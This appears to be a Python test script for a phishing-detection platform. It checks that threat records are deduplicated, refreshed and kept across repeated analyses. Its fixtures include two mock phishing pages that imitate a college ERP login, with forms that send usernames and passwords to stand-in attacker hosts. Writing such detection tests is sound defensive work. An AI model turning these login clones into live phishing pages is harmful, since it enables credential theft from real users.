#!/usr/bin/env python3
"""
scripts/test_threat_dedup_and_persistence.py
Verification test script for threat deduplication (upsert) and persistence rules.
"""

import sys
import time
import requests

BASE_URL = "http://localhost:8000/api"

# Sample HTML phishing content imitating YCCE ERP
MOCK_PHISHING_HTML = """
<!DOCTYPE html>
<html>
<head><title>YCCE Student Login - ERP Portal</title></head>
<body>
    <div class="login-box">
        <img src="https://ycce.edu/logo.png" alt="YCCE College Logo" />
        <h2>YCCE Meghe Group ERP Student & Staff Login</h2>
        <form action="http://ycce-erp-login.xyz/submit-credentials" method="POST">
            <input type="text" name="username" placeholder="Registration ID / Username" />
            <input type="password" name="password" placeholder="Password" />
            <button type="submit">Sign In</button>
        </form>
    </div>
</body>
</html>
"""

# Sample HTML imitating the localhost test page (suspicious login form imitating YCCE)
MOCK_SUSPICIOUS_HTML = """
<!DOCTYPE html>
<html>
<head><title>YCCE ERP Portal - Student Login</title></head>
<body>
    <div class="login-wrapper">
        <img src="http://localhost:8004/images/ycce-logo.png" alt="YCCE College" />
        <h2>YCCE Meghe Group ERP Student & Staff Login</h2>
        <form action="http://attacker-server.ru/collect" method="POST">
            <input type="text" name="username" placeholder="Registration ID / Username" />
            <input type="password" name="password" placeholder="Password" />
            <button type="submit">Sign In</button>
        </form>
    </div>
</body>
</html>
"""

def get_threats():
    r = requests.get(f"{BASE_URL}/threats")
    assert r.status_code == 200, f"GET /threats failed: {r.text}"
    return r.json()

def main():
    print("==========================================================")
    print("Running CTIP Threat Deduplication & Persistence Tests")
    print("==========================================================")

    # 1. Baseline check
    initial_threats = get_threats()
    print(f"[1] Initial active threats count: {len(initial_threats)}")
    initial_erp_threats = [t for t in initial_threats if t["domain"] == "ycce-erp-login.xyz"]
    assert len(initial_erp_threats) == 1, f"Expected 1 ycce-erp-login.xyz threat, got {len(initial_erp_threats)}"
    initial_timestamp = initial_erp_threats[0]["detected_at"]
    print(f"    Existing ycce-erp-login.xyz threat ID: {initial_erp_threats[0]['id']}, detected_at: {initial_timestamp}")

    time.sleep(1)

    # 2. Analyze ycce-erp-login.xyz first time
    print("\n[2] Triggering POST /api/analyze for ycce-erp-login.xyz (Call 1)...")
    r1 = requests.post(f"{BASE_URL}/analyze", json={
        "url": "https://ycce-erp-login.xyz/login.html",
        "domain": "ycce-erp-login.xyz",
        "html": MOCK_PHISHING_HTML
    })
    assert r1.status_code == 200, f"Analyze failed: {r1.text}"
    res1 = r1.json()
    print(f"    Result 1: status={res1['status']}, risk_score={res1['risk_score']}")

    threats_after_1 = get_threats()
    erp_threats_1 = [t for t in threats_after_1 if t["domain"] == "ycce-erp-login.xyz"]
    assert len(erp_threats_1) == 1, f"Expected exactly 1 threat row after Call 1, found {len(erp_threats_1)}"
    updated_timestamp_1 = erp_threats_1[0]["detected_at"]
    print(f"    Threats count: {len(threats_after_1)}, detected_at updated to: {updated_timestamp_1}")

    time.sleep(1)

    # 3. Analyze ycce-erp-login.xyz second time (Deduplication / Upsert check)
    print("\n[3] Triggering POST /api/analyze for ycce-erp-login.xyz (Call 2 - Immediate repeat)...")
    r2 = requests.post(f"{BASE_URL}/analyze", json={
        "url": "https://ycce-erp-login.xyz/login.html",
        "domain": "ycce-erp-login.xyz",
        "html": MOCK_PHISHING_HTML
    })
    assert r2.status_code == 200, f"Analyze failed: {r2.text}"
    res2 = r2.json()
    print(f"    Result 2: status={res2['status']}, risk_score={res2['risk_score']}")

    threats_after_2 = get_threats()
    erp_threats_2 = [t for t in threats_after_2 if t["domain"] == "ycce-erp-login.xyz"]
    assert len(erp_threats_2) == 1, f"Expected exactly 1 threat row after Call 2, found {len(erp_threats_2)}"
    updated_timestamp_2 = erp_threats_2[0]["detected_at"]
    print(f"    Threats count: {len(threats_after_2)} (NO DUPLICATE ROW CREATED ✅)")
    print(f"    Timestamp refreshed: {updated_timestamp_2} (was: {updated_timestamp_1})")

    # 4. Test extension-triggered analysis on localhost:8004 (SUSPICIOUS score ~56)
    print("\n[4] Triggering POST /api/analyze for http://localhost:8004/test-login-page.html (Extension simulation)...")
    r3 = requests.post(f"{BASE_URL}/analyze", json={
        "url": "http://localhost:8004/test-login-page.html",
        "domain": "localhost",
        "dom_snapshot": MOCK_SUSPICIOUS_HTML
    })
    assert r3.status_code == 200, f"Analyze failed: {r3.text}"
    res3 = r3.json()
    print(f"    Result 3: status={res3['status']}, risk_score={res3['risk_score']}")
    print(f"    Risk Score >= 50 check: {res3['risk_score'] >= 50}")

    threats_after_3 = get_threats()
    localhost_threats = [t for t in threats_after_3 if t["domain"] == "localhost"]
    assert len(localhost_threats) == 1, f"Expected localhost threat in /threats table! Found {len(localhost_threats)}"
    print(f"    Found localhost threat in DB: ID={localhost_threats[0]['id']}, score={localhost_threats[0]['risk_score']} ✅")

    # 5. Test repeat analysis on localhost (upsert check for localhost)
    print("\n[5] Triggering repeat POST /api/analyze for localhost (Upsert check)...")
    r4 = requests.post(f"{BASE_URL}/analyze", json={
        "url": "http://localhost:8004/test-login-page.html",
        "domain": "localhost",
        "domSnapshot": MOCK_SUSPICIOUS_HTML
    })
    assert r4.status_code == 200
    threats_after_4 = get_threats()
    localhost_threats_2 = [t for t in threats_after_4 if t["domain"] == "localhost"]
    assert len(localhost_threats_2) == 1, f"Expected 1 localhost threat after repeat call, found {len(localhost_threats_2)}"
    print(f"    Localhost threats count still 1 (Upsert successful ✅)")

    # 6. Test edge case: RESOLVED threat re-analyzed creates a new ACTIVE threat
    print("\n[6] Testing edge case: RESOLVED threat re-analyzed creates new ACTIVE row...")
    # Mark localhost threat as RESOLVED
    local_id = localhost_threats_2[0]["id"]
    r_status = requests.post(f"{BASE_URL}/threats/{local_id}/status", json={"status": "RESOLVED"})
    assert r_status.status_code == 200, f"Status update failed: {r_status.text}"
    print(f"    Marked threat {local_id} as RESOLVED.")

    # Re-analyze localhost
    r5 = requests.post(f"{BASE_URL}/analyze", json={
        "url": "http://localhost:8004/test-login-page.html",
        "domain": "localhost",
        "html": MOCK_SUSPICIOUS_HTML
    })
    assert r5.status_code == 200
    threats_after_5 = get_threats()
    all_localhost = [t for t in threats_after_5 if t["domain"] == "localhost"]
    active_localhost = [t for t in all_localhost if t["threat_status"] == "ACTIVE"]
    resolved_localhost = [t for t in all_localhost if t["threat_status"] == "RESOLVED"]
    assert len(active_localhost) == 1, f"Expected 1 new ACTIVE localhost threat, got {len(active_localhost)}"
    assert len(resolved_localhost) == 1, f"Expected 1 RESOLVED localhost threat retained, got {len(resolved_localhost)}"
    print(f"    Successfully created new ACTIVE threat row ({active_localhost[0]['id']}) while preserving historical RESOLVED row ({resolved_localhost[0]['id']}) ✅")

    print("\n==========================================================")
    print("ALL TESTS PASSED SUCCESSFULLY! 🎉")
    print("==========================================================")

if __name__ == "__main__":
    main()
